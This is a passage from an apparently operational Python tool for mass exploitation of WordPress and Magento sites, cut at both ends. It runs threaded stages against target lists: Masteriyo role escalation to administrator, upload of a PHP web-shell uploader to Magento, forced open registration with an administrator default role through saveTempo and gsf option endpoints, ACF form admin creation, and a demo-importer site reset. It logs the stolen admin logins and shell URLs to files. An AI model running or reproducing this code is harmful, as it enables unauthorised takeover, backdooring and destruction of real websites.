    if os.path.isfile(ini_path):
        try:
            cfg.read(ini_path, encoding="utf-8")
        except Exception:
            cfg.read(ini_path)
        if cfg.has_section("masteriyo"):
            if cfg.has_option("masteriyo", "mode"):
                mode = cfg.get("masteriyo", "mode").strip().lower()
            if cfg.has_option("masteriyo", "nx2_user"):
                nx2_user = cfg.get("masteriyo", "nx2_user").strip()
            if cfg.has_option("masteriyo", "nx2_password"):
                nx2_password = cfg.get("masteriyo", "nx2_password").strip()
    if mode not in ("1", "2", "both"):
        mode = "both"

    log_info(stage_name, f"Starting Masteriyo ({len(targets)} targets, mode={mode})")

    prefix = resolve_credential("username_prefix", "Nxploited")
    email_cfg = resolve_credential("email", "")
    default_pass = resolve_credential("password", "Nx_admin")

    ACCOUNT_PATH = "/account/"
    SIGNUP_PATH = "/account/signup/"
    REGISTER_POST_PATH = "/st/"
    DASHBOARD_PATH = "/account/#/dashboard"
    AJAX_PATH = "/wp-admin/admin-ajax.php"

    # ========== INLINE HELPERS (from original CVE-2026-4484.py) ==========

    def _extract_all_nonces(html: str) -> dict:
        nonces = {}
        html_unescaped = _html_mod.unescape(html)
        variants = [
            html_unescaped,
            html_unescaped.replace('\\"', '"'),
            html_unescaped.replace("\\'", "'"),
        ]
        regex_patterns = [
            (r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', "_wpnonce"),
            (r'value=["\']([^"\']+)["\'][^>]*name=["\']_wpnonce["\']', "_wpnonce"),
            (r'id=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', "_wpnonce"),
            (r'["\']_wpnonce["\']\s*[:=]\s*["\']([^"\']+)["\']', "_wpnonce"),
            (r'["\']nonce["\']\s*[:=]\s*["\']([^"\']+)["\']', "nonce"),
            (r'["\']wp_rest["\']\s*[:=]\s*["\']([^"\']+)["\']', "wp_rest"),
        ]
        for text in variants:
            for pat, fixed_key in regex_patterns:
                for m in re.finditer(pat, text, re.IGNORECASE | re.DOTALL):
                    value = m.group(1)
                    if fixed_key not in nonces:
                        nonces[fixed_key] = set()
                    nonces[fixed_key].add(value)
        return nonces

    def _get_best_login_nonce(html: str) -> Optional[str]:
        nonces = _extract_all_nonces(html)
        for k in ["_wpnonce", "nonce", "login_nonce"]:
            if k in nonces and nonces[k]:
                return next(iter(nonces[k]))
        for k in nonces:
            if "nonce" in k.lower() and nonces[k]:
                return next(iter(nonces[k]))
        return None

    def _get_best_signup_nonce(html: str) -> Optional[str]:
        nonces = _extract_all_nonces(html)
        for k in ["_wpnonce", "signup_nonce", "registration_nonce"]:
            if k in nonces and nonces[k]:
                return next(iter(nonces[k]))
        for k in nonces:
            if "nonce" in k.lower() and nonces[k]:
                return next(iter(nonces[k]))
        return None

    def _has_logged_in_cookie(session: requests.Session) -> bool:
        for c in session.cookies:
            if c.name.startswith("wordpress_logged_in_"):
                return True
        return False

    def _extract_dashboard_context(html: str) -> Tuple[Optional[str], Optional[str]]:
        user_id = None
        nonce = None
        m_uid = re.search(r'"current_user_id"\s*:\s*"(\d+)"', html, re.IGNORECASE)
        if m_uid:
            user_id = m_uid.group(1)
        m_nonce = re.search(r'"nonce"\s*:\s*"([A-Za-z0-9]{4,64})"', html, re.IGNORECASE)
        if m_nonce:
            nonce = m_nonce.group(1)
        return user_id, nonce

    def _verify_admin_access(session: requests.Session, base: str) -> bool:
        admin_urls = [
            f"{base}/wp-admin/",
            f"{base}/wp-admin/index.php",
            f"{base}/wp-admin/users.php",
        ]
        for admin_url in admin_urls:
            try:
                h = {"User-Agent": get_random_ua()}
                r = session.get(admin_url, timeout=timeout, verify=False, headers=h, allow_redirects=False)
                if r.status_code == 200:
                    content = r.text.lower()
                    indicators = [
                        "dashboard", "wp-admin-bar", "adminmenu", "manage_options",
                        "users.php", "plugins.php", "themes.php", "wp-admin/index.php",
                    ]
                    if any(i in content for i in indicators):
                        return True
                elif r.status_code in (301, 302):
                    location = r.headers.get("Location", "")
                    if "wp-login.php" in location:
                        return False
            except Exception:
                continue
        return False

    def _verify_plugin_access(session: requests.Session, base: str) -> Tuple[bool, Optional[str]]:
        plugin_urls = [
            f"{base}/wp-admin/plugin-install.php",
            f"{base}/wp-admin/plugin-install.php?tab=upload",
            f"{base}/wp-admin/plugins.php?page=plugin-install",
        ]
        for plugin_url in plugin_urls:
            try:
                h = {"User-Agent": get_random_ua()}
                r = session.get(plugin_url, timeout=timeout, verify=False, headers=h, allow_redirects=False)
                if r.status_code == 200:
                    content = r.text.lower()
                    indicators = [
                        "plugin-install-tab", "upload-plugin", "plugin-upload-form",
                        "install-plugin-upload", "pluginzip", "browse plugins", "add plugins",
                    ]
                    if any(i in content for i in indicators):
                        return True, plugin_url
                elif r.status_code in (301, 302):
                    location = r.headers.get("Location", "")
                    if "wp-login.php" in location:
                        return False, plugin_url
            except Exception:
                continue
        return False, None

    def _is_admin_session(base: str, session: requests.Session) -> bool:
        admin_ok = _verify_admin_access(session, base)
        plugin_ok, purl = _verify_plugin_access(session, base)
        if admin_ok and plugin_ok:
            return True
        if plugin_ok:
            return True
        if admin_ok:
            return True
        return False

    def _masteriyo_register(base: str, session: requests.Session,
                            username: str, email_addr: str, pwd: str) -> Tuple[bool, str]:
        signup_url = base.rstrip("/") + SIGNUP_PATH
        st_url = base.rstrip("/") + REGISTER_POST_PATH
        try:
            r_get = session.get(signup_url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
        except Exception:
            return False, "signup_get_failed"
        if r_get.status_code != 200:
            return False, f"signup_get_status_{r_get.status_code}"
        wpnonce = _get_best_signup_nonce(r_get.text)
        if not wpnonce:
            return False, "signup_no_wpnonce"
        local_part = email_addr.split("@")[0] or username
        data = {
            "remember": "true",
            "_wpnonce": wpnonce,
            "first-name": local_part,
            "last-name": "user",
            "username": username,
            "email": email_addr,
            "password": pwd,
            "confirm-password": pwd,
            "masteriyo-registration": "yes",
        }
        try:
            r_post = session.post(st_url, data=data, timeout=timeout, verify=False)
        except Exception:
            return False, "signup_post_failed"
        body = (r_post.text or "").lower()
        if any(x in body for x in ["email is already registered", "user already exists", "username is already taken"]):
            return True, "signup_email_or_user_already_registered"
        if any(x in body for x in ["check your email", "verify your email", "activation email"]):
            return True, "registered_needs_email_verification"
        if any(x in body for x in ["registration complete", "account created", "successfully registered"]):
            return True, "registered_ok"
        return True, "registered_unclear"

    def _masteriyo_login(base: str, session: requests.Session,
                         username_or_email: str, pwd: str) -> Tuple[bool, str]:
        account_url = base.rstrip("/") + ACCOUNT_PATH
        ajax_url = base.rstrip("/") + AJAX_PATH
        try:
            r_get = session.get(account_url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
        except Exception:
            return False, "account_get_failed"
        if r_get.status_code != 200:
            return False, f"account_get_status_{r_get.status_code}"
        wpnonce = _get_best_login_nonce(r_get.text)
        if not wpnonce:
            return False, "login_no_wpnonce"
        account_url_clean = account_url.rstrip("/")
        data = {
            "action": "masteriyo_login",
            "_wpnonce": wpnonce,
            "_wp_http_referer": ACCOUNT_PATH,
            "username": username_or_email,
            "password": pwd,
            "redirect_to": account_url_clean,
        }
        headers_post = {
            "User-Agent": get_random_ua(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": account_url,
        }
        try:
            r_post = session.post(ajax_url, data=data, headers=headers_post, timeout=timeout, verify=False)
        except Exception:
            return False, "ajax_post_failed"
        try:
            j = r_post.json()
            if not j.get("success"):
                return False, "login_ajax_not_success"
        except Exception:
            pass
        if not _has_logged_in_cookie(session):
            return False, "login_no_logged_in_cookie"
        return True, "login_ok"

    def _masteriyo_fetch_dashboard(base: str, session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
        dash_url = base.rstrip("/") + DASHBOARD_PATH
        try:
            r = session.get(dash_url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False, allow_redirects=True)
        except Exception:
            return None, None
        if r.status_code != 200:
            return None, None
        return _extract_dashboard_context(r.text)

    def _masteriyo_escalate(base: str, session: requests.Session,
                            user_id: str, nonce: str) -> Tuple[bool, str]:
        url = base.rstrip("/") + f"/wp-json/masteriyo/v1/users/instructors/{user_id}"
        headers = {
            "User-Agent": get_random_ua(),
            "Content-Type": "application/json",
            "X-WP-Nonce": nonce,
        }
        payload = {"roles": ["administrator"]}
        try:
            r = session.post(url, headers=headers, data=json.dumps(payload), timeout=timeout, verify=False)
        except Exception:
            return False, "escalate_post_failed"
        body = r.text or ""
        try:
            j = r.json()
            roles = j.get("roles") or []
            if "administrator" in roles:
                return True, "escalate_admin_ok_json"
            return False, "escalate_no_admin_in_roles_json"
        except Exception:
            if '"roles":["administrator"' in body:
                return True, "escalate_admin_ok_text"
            return False, "escalate_invalid_json"

    def _write_success_line(base: str, login_name: str, pwd: str) -> None:
        p = urlparse(base)
        login_url = f"{p.scheme}://{p.netloc}/wp-login.php"
        line = f"{login_url} user:{login_name}|pass:{pwd}"
        stage_write(stage_name, "Login_admin.txt", line)

    def _run_nx1(base: str, username: str, email_addr: str, pwd: str) -> bool:
        session = build_session(timeout)
        reg_ok, _ = _masteriyo_register(base, session, username, email_addr, pwd)
        if not reg_ok:
            return False
        login_ok, _ = _masteriyo_login(base, session, email_addr, pwd)
        if not login_ok:
            return False
        user_id, nonce = _masteriyo_fetch_dashboard(base, session)
        if not user_id or not nonce:
            return False
        esc_ok, _ = _masteriyo_escalate(base, session, user_id, nonce)
        if not esc_ok:
            return False
        post_sess = build_session(timeout)
        post_login_ok, _ = _masteriyo_login(base, post_sess, email_addr, pwd)
        if not post_login_ok:
            return False
        if _is_admin_session(base, post_sess):
            _write_success_line(base, email_addr, pwd)
            safe_write_result("vulnurls.txt", base)
            return True
        return False

    def _run_nx2(base: str, login_name: str, pwd: str) -> bool:
        session = build_session(timeout)
        login_ok, _ = _masteriyo_login(base, session, login_name, pwd)
        if not login_ok:
            return False
        user_id, nonce = _masteriyo_fetch_dashboard(base, session)
        if not user_id or not nonce:
            return False
        esc_ok, _ = _masteriyo_escalate(base, session, user_id, nonce)
        if not esc_ok:
            return False
        post_sess = build_session(timeout)
        post_login_ok, _ = _masteriyo_login(base, post_sess, login_name, pwd)
        if not post_login_ok:
            return False
        if _is_admin_session(base, post_sess):
            _write_success_line(base, login_name, pwd)
            safe_write_result("vulnurls.txt", base)
            return True
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            ok = False
            if mode in ("1", "both"):
                rnd = str(random.randint(1000, 9999))
                username = f"{prefix}_{rnd}"
                if email_cfg and "@" in email_cfg:
                    local, dom = email_cfg.split("@", 1)
                    email_addr = f"{local}+{rnd}@{dom}"
                elif email_cfg:
                    email_addr = email_cfg
                else:
                    email_addr = f"{prefix}_{rnd}@test.com"
                if _run_nx1(base, username, email_addr, default_pass):
                    ok = True
            if mode in ("2", "both"):
                if nx2_user and nx2_password:
                    if _run_nx2(base, nx2_user, nx2_password):
                        ok = True
            return ok
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 8: MAGENTO
# ============================================================================

def run_magento(targets: List[str], threads: int, timeout: int) -> Dict:
    """Magento: create cart → GraphQL SKU → base64 shell upload via custom_options → verify."""
    stage_name = "Magento"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "magento_shells.txt"
    log_info(stage_name, f"Starting Magento full chain ({len(targets)} targets)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            cart_url = f"{base}/rest/default/V1/guest-carts"
            cr = session.post(cart_url, timeout=timeout, verify=False)
            if cr.status_code != 200:
                return False
            cart_id = cr.json().strip('"') if cr.text else None
            if not cart_id:
                return False

            sku = "24-MB01"
            try:
                gql = session.post(f"{base}/graphql", json={"query": "{ products { items { sku } } }"}, timeout=timeout, verify=False)
                if gql.status_code == 200:
                    data = gql.json()
                    items = data.get("data", {}).get("products", {}).get("items", [])
                    if items:
                        sku = items[0].get("sku", sku)
            except Exception:
                pass

            shell_content = b'<?php echo \'<title> NezukaBot Here! </title><b><pre>{ Priv8 Uploader By NezukaBot }</b>\'.\'<br><br>\'.\'<b>System Info:</b> \'.php_uname().\'<br>\'.\'<b>Current Directory:</b> \'.getcwd();echo \'<br><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="20"><input name="_upl" type="submit" id="_upl" value="upload"></form></td></tr></table></pre>\';if($_FILES){if(!empty($_FILES[\'file\'])){move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']);echo "<b>File Uploaded !!!</b><br>name : ".$_FILES[\'file\'][\'name\']."<br>size : ".$_FILES[\'file\'][\'size\']."<br>type : ".$_FILES[\'file\'][\'type\'];}else{echo "<b>Upload Failed !!!</b><br><br>";}}?>\n'
            import base64 as b64
            b64_shell = b64.b64encode(shell_content).decode()
            filename = "Nx.php"

            item_payload = {
                "cartItem": {
                    "sku": sku,
                    "qty": 1,
                    "quote_id": cart_id,
                    "product_option": {
                        "extension_attributes": {
                            "custom_options": [{
                                "option_id": "1",
                                "option_value": "1",
                                "extension_attributes": {
                                    "file_info": {
                                        "base64_encoded_data": b64_shell,
                                        "type": "application/x-php",
                                        "name": filename
                                    }
                                }
                            }]
                        }
                    }
                }
            }
            item_url = f"{base}/rest/default/V1/guest-carts/{cart_id}/items"
            ir = session.post(item_url, json=item_payload, timeout=timeout, verify=False)
            if ir.status_code not in (200, 201):
                return False

            fname_first = filename[:1].upper()
            fname_second = filename[1:2].upper() if len(filename) > 1 else filename[:1].upper()
            shell_path = f"{base}/media/custom_options/quote/{fname_first}/{fname_second}/{filename}"
            try:
                vr = session.get(shell_path, timeout=timeout, verify=False)
                if vr.status_code == 200 and "NezukaBot Here" in vr.text:
                    stage_write("Magento", f"{shell_path}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 9: NXZERO
# ============================================================================

def run_nxzero(targets: List[str], threads: int, timeout: int) -> Dict:
    """Nxzero saveTempo exploit — 100% match Nxzero_4.py."""
    stage_name = "Nxzero"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}

    log_info(stage_name, f"Starting Nxzero saveTempo ({len(targets)} targets)")

    def _nxc_success_users(body: str, status: int) -> bool:
        if status != 200 or not body:
            return False
        b = body.replace(" ", "").replace("\n", "").lower()
        patterns = [
            '"users_can_register":"1"',
            '"key":"users_can_register"',
            '"action":"update"',
        ]
        return all(p in b for p in patterns)

    def _nxc_success_role(body: str, status: int) -> bool:
        if status != 200 or not body:
            return False
        b = body.replace(" ", "").replace("\n", "").lower()
        patterns = [
            '"default_role":"administrator"',
            '"key":"default_role"',
            '"action":"update"',
        ]
        return all(p in b for p in patterns)

    def _nxc_call_savetempo(site: str, key: str, value: str, mode_str: str) -> str:
        url = f"{site}/wp-admin/admin-ajax.php"
        params = {"action": "saveTempo", "key": key, "value": value}
        s = build_session(timeout)
        try:
            r = s.get(url, params=params, timeout=timeout, allow_redirects=True, verify=False)
        except Exception as e:
            msg = str(e).lower()
            if "timed out" in msg or "timeout" in msg:
                return "dead"
            return "fail"
        body = r.text or ""
        if mode_str == "users":
            return "ok" if _nxc_success_users(body, r.status_code) else "fail"
        return "ok" if _nxc_success_role(body, r.status_code) else "fail"

    def _nxc_write_hit(site: str) -> None:
        reg_url = f"{site}/wp-login.php?action=register"
        line = f"{site} | register_url: {reg_url}"
        stage_write(stage_name, "Nx_admin_.txt", line)

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False

            r1 = _nxc_call_savetempo(base, "users_can_register", "1", "users")
            if r1 == "dead":
                return False
            if r1 != "ok":
                return False

            r2 = _nxc_call_savetempo(base, "default_role", "administrator", "role")
            if r2 == "dead":
                return False
            if r2 != "ok":
                return False

            _nxc_write_hit(base)
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 10: N_X
# ============================================================================

def run_nx(targets: List[str], threads: int, timeout: int) -> Dict:
    """N_X: reset shop secret → set users_can_register + default_role → auto-register user."""
    stage_name = "N_X"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting N_X full chain ({len(targets)} targets)")

    SUCCESS_RESET_PATTERN = re.compile(r"app secret key has been updated successfully", re.I)
    SUCCESS_OPTION_PATTERN = re.compile(r"wordpress option has been created or updated successfully", re.I)
    REGISTER_OPEN_PATTERN = re.compile(r"Users can register|Anyone can register|user\_registration|registerform", re.I)

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            secret = resolve_credential("shop_secret", "Nxploited_newSecret")
            prefix = resolve_credential("username_prefix", "Nxploited")
            reg_username = resolve_credential("reg_username", f"Nx_test{random.randint(100, 999)}")
            reg_email = resolve_credential("email", "sp0k4club@gmail.com")
            reg_password = resolve_credential("password", "Nx_adminSA")

            url = f"{base}/wp-json/gsf/v1/update-options"

            r1 = session.post(url, data={"action": "resetStoreConfigrations", "shop_secret": secret}, timeout=timeout, verify=False)
            if not SUCCESS_RESET_PATTERN.search(r1.text or ""):
                return False

            r2 = session.post(url, data={"action": "createUpdateOption", "shop_secret": secret, "option_key": "users_can_register", "option_value": "1"}, timeout=timeout, verify=False)
            r3 = session.post(url, data={"action": "createUpdateOption", "shop_secret": secret, "option_key": "default_role", "option_value": "administrator"}, timeout=timeout, verify=False)
            if not SUCCESS_OPTION_PATTERN.search(r2.text or ""):
                r3_ok = SUCCESS_OPTION_PATTERN.search(r3.text or "") if r3 else False
                if not r3_ok:
                    return False

            reg_url = f"{base}/wp-login.php?action=register"
            try:
                r_reg = session.get(reg_url, headers={"User-Agent": get_random_ua(), "Referer": base}, timeout=timeout, verify=False)
                reg_open, _ = (True, "register_open") if (r_reg.status_code == 200 and REGISTER_OPEN_PATTERN.search(r_reg.text or "")) else (False, "register_closed")
            except Exception:
                reg_open = False

            nonce = extract_nonce(r_reg.text or "", "_wpnonce") if r_reg and r_reg.status_code == 200 else ""

            data = {
                "user_login": reg_username,
                "user_email": reg_email,
            }
            body_lower = (r_reg.text or "").lower()
            if "user_pass" in body_lower or "password" in body_lower:
                data["user_pass"] = reg_password
                data["user_pass2"] = reg_password
            data["_wpnonce"] = nonce or ""
            data["_wp_http_referer"] = "/wp-login.php?action=register"
            data["redirect_to"] = ""
            data["wp-submit"] = "Register"

            detail_reguser = ""
            registered = False
            try:
                reg_resp = session.post(reg_url, data=data, timeout=timeout, verify=False)
                txt = (reg_resp.text or "").lower()
                if any(s in txt for s in ["registration complete", "check your email", "user registered"]):
                    registered = True
                    detail_reguser = f"registered user={reg_username} email={reg_email} pass={reg_password}"
                elif "username" in txt and "already" in txt and "exists" in txt:
                    registered = True
                    detail_reguser = "user_already_exists"
            except Exception:
                pass

            reg_extra = f"register_open" if reg_open else "register_closed"
            if registered:
                stage_write(stage_name, "Login_admin.txt",
                            f"{base} | register_url: {reg_url} | shop_secret: {secret} | {reg_extra}, {detail_reguser}")
            else:
                stage_write(stage_name, "Login_admin.txt",
                            f"{base} | register_url: {reg_url} | shop_secret: {secret} | {reg_extra}, reg_fail")
            safe_write_result("vulnurls.txt", base)
            if registered:
                safe_write_result("login.txt", f"{base} | {reg_username} | {reg_password} | {reg_email} | {base}/wp-login.php")
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 11: ACF FRONTEND FORM
# ============================================================================

def run_acf_form(targets: List[str], threads: int, timeout: int) -> Dict:
    """ACF Frontend Form: discover form → map username/email/password/role fields → POST admin creation."""
    stage_name = "ACF-Form"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting ACF Form full chain ({len(targets)} targets)")

    REGISTER_PATHS = [
        "/", "/register/", "/registration/", "/signup/", "/sign-up/", "/sign_up/",
        "/user-registration/", "/user/register/", "/user/signup/", "/users/register/",
        "/account/", "/my-account/", "/myaccount/", "/new-account/", "/create-account/",
        "/create-user/", "/create-user-account/", "/member/register/", "/members/register/",
        "/profile/register/", "/join/", "/join-us/", "/frontend-form/",
        "/frontend-form-register/", "/frontend-register/", "/frontend-registration/",
        "/user-registration-form/",
    ]

    def is_user_field_name(name):
        m = re.fullmatch(r"acff\[user]\[(field_[A-Za-z0-9]+)]", name)
        if not m: return None
        return m.group(1)

    def find_frontend_form(html):
        acf_hidden = {}
        user_fields = {}
        for m in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*name=["\'](_acf_[^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.I):
            acf_hidden[m.group(1)] = m.group(2)
        if not acf_hidden.get("_acf_nonce") or not acf_hidden.get("_acf_form"):
            return None, None
        for m in re.finditer(r'name=["\']acff\[user\]\[(field_[A-Za-z0-9]+)\]["\']', html):
            fid = m.group(1)
            start = max(0, m.start() - 400)
            end = min(len(html), m.end() + 100)
            ctx = html[start:end].lower()
            ltype = ctx.split('data-type="', 1)[1].split('"', 1)[0] if 'data-type="' in ctx else ""
            lname = ctx.split('data-name="', 1)[1].split('"', 1)[0] if 'data-name="' in ctx else ""
            label_m = re.search(r'<label[^>]*>([^<]+)</label>', ctx, re.I)
            label = label_m.group(1).strip() if label_m else ""
            user_fields[fid] = {"type": ltype, "name": lname, "label": label}
        return acf_hidden, user_fields

    def map_fields(user_fields):
        username_fid = email_fid = password_fid = role_fid = first_fid = last_fid = None
        for fid, info in user_fields.items():
            label = (info.get("label") or "").lower()
            ftype = (info.get("type") or "").lower()
            dname = (info.get("name") or "").lower()
            if not username_fid and ("username" in label or dname == "fea_username"):
                username_fid = fid
            if not email_fid and ("email" in label or ftype == "user_email"):
                email_fid = fid
            if not password_fid and ("password" in label or ftype == "user_password"):
                password_fid = fid
            if not first_fid and ("first name" in label or dname == "fea_first_name"):
                first_fid = fid
            if not last_fid and ("last name" in label or dname == "fea_last_name"):
                last_fid = fid
            if not role_fid and (ftype == "role" or "role" in label or dname == "fea_role"):
                role_fid = fid
        if not (username_fid and email_fid and password_fid and role_fid):
            return None
        return {"username": username_fid, "email": email_fid, "password": password_fid, "first": first_fid, "last": last_fid, "role": role_fid}

    def check_success(response_text):
        try:
            j = json.loads(response_text)
            if isinstance(j, dict) and j.get("success") is True:
                return True, j
        except Exception:
            pass
        flat = response_text.replace(" ", "").replace("\n", "").lower()
        if '"success":true' in flat:
            return True, None
        return False, None

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            prefix = resolve_credential("username_prefix", "Nxploited")
            username = resolve_credential("acf_username", f"Nxadmin{random.randint(100, 999)}")
            email = resolve_credential("email", "sp0k4club@gmail.com")
            password = resolve_credential("password", "NxAdmin_1337")

            for path in REGISTER_PATHS:
                try:
                    url = f"{base}{path}"
                    resp = session.get(url, timeout=timeout, verify=False)
                    if resp.status_code != 200: continue
                    acf_hidden, user_fields = find_frontend_form(resp.text)
                    if not acf_hidden: continue
                    mapped = map_fields(user_fields)
                    if not mapped: continue

                    base_data = dict(acf_hidden)
                    base_data.setdefault("_acf_validation", "1")
                    base_data.setdefault("_acf_changed", "1")
                    base_data.setdefault("_acf_status", "")
                    base_data.setdefault("_acf_message", "")
                    base_data.setdefault("_acf_required_message", "")
                    base_data["acff[_validate_email]"] = ""

                    base_data[f"acff[user][{mapped['username']}]"] = username
                    base_data[f"acff[user][{mapped['email']}]"] = email
                    base_data[f"acff[user][{mapped['password']}]"] = password
                    base_data[f"acff[user][{mapped['role']}]"] = "administrator"
                    if mapped.get("first"):
                        base_data[f"acff[user][{mapped['first']}]"] = "Nx"
                    if mapped.get("last"):
                        base_data[f"acff[user][{mapped['last']}]"] = "ploited"

                    base_data["custom_password"] = mapped["password"]
                    base_data["password-strength"] = "4"
                    base_data["action"] = "frontend_admin/form_submit"

                    ajax_url = f"{base}/wp-admin/admin-ajax.php"
                    headers = {
                        "User-Agent": get_random_ua(),
                        "Accept": "*/*",
                        "X-Requested-With": "XMLHttpRequest",
                        "Origin": base,
                        "Referer": url,
                    }
                    pr = requests.post(ajax_url, data=base_data, headers=headers, timeout=timeout, verify=False)
                    ok, j = check_success(pr.text)
                    if ok:
                        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        line = f"[{ts}] BASE={base} FORM={url} USER={username} EMAIL={email} PASS={password} JSON={json.dumps(j, ensure_ascii=False) if j is not None else 'null'}"
                        stage_write(stage_name, "acf_success.txt", line)
                        safe_write_result("vulnurls.txt", base)
                        safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
                        return True
                except Exception:
                    continue
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 12: WP EMAIL REGISTER
# ============================================================================

def run_wp_email_register(targets: List[str], threads: int, timeout: int) -> Dict:
    """WP Email Register exploit."""
    stage_name = "WP-EmailReg"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wp_email_register_results.txt"
    
    log_info(stage_name, f"Starting WP Email Register stage ({len(targets)} targets)")
    
    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            username = "Ykzer"
            email = f"Ykzer_{random.randint(1000, 9999)}@test.com"
            password = "Ykzer_SA"

            reg_url = f"{base}/wp-login.php?action=register"
            try:
                rr = session.get(reg_url, timeout=timeout, verify=False)
                nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', rr.text)
                nonce = nm.group(1) if nm else None
            except Exception:
                return False

            reg_data = {"user_login": username, "user_email": email, "redirect_to": "", "wp-submit": "Register"}
            if nonce:
                reg_data["_wpnonce"] = nonce
            try:
                session.post(reg_url, data=reg_data, timeout=timeout, verify=False)
            except Exception:
                pass

            s2 = build_session(timeout)
            lp = {"log": username, "pwd": password, "wp-submit": "Log In", "testcookie": "1", "redirect_to": f"{base}/wp-admin/"}
            try:
                lr = s2.post(f"{base}/wp-login.php", data=lp, timeout=timeout, verify=False, allow_redirects=True)
                if "wp-login.php" in lr.url:
                    return False
            except Exception:
                return False

            rest_nonce = None
            try:
                ar = s2.get(f"{base}/wp-admin/", timeout=timeout, verify=False)
                m = re.search(r'wpApiSettings\s*=\s*(\{.*?\});', ar.text, re.DOTALL)
                if m:
                    obj = json.loads(m.group(1).replace("'", '"'))
                    rest_nonce = obj.get("nonce")
            except Exception:
                pass
            if not rest_nonce:
                return False

            ajax_url = f"{base}/wp-admin/admin-ajax.php?action=demo_importer_plus"
            headers = {"Content-Type": "application/json", "X-WP-Nonce": rest_nonce}
            payload = {"demo_action": "do-reinstall"}
            try:
                dr = session.post(ajax_url, json=payload, headers=headers, timeout=timeout, verify=False)
                if dr.status_code == 200 and "site has been reset" in dr.text.lower():
                    stage_write(stage_name, "wp_email_register_results.txt",
                                f"{base}/wp-login.php site:{base}/wp-login.php user:{username} pass:{password} type:admin")
                    safe_write_result("vulnurls.txt", base)
                    safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
                    return True
            except Exception:
                pass
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 13: WP RESET CORE
# ============================================================================

def run_wp_reset(targets: List[str], threads: int, timeout: int) -> Dict:
    """WP Reset Core - CVE-2025-15030: lostpassword key injection -> resetpass -> admin access verify."""
    stage_name = "WP-Reset"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting WP Reset Core full chain ({len(targets)} targets)")

    def _split_wp_base(url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urlparse(url)
        base_host = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        if path == "/":
            return base_host, ""
        return base_host, path.rstrip("/")

    def _build_wp_url(base_host, wp_base, path):
        if not path.startswith("/"):
            path = "/" + path
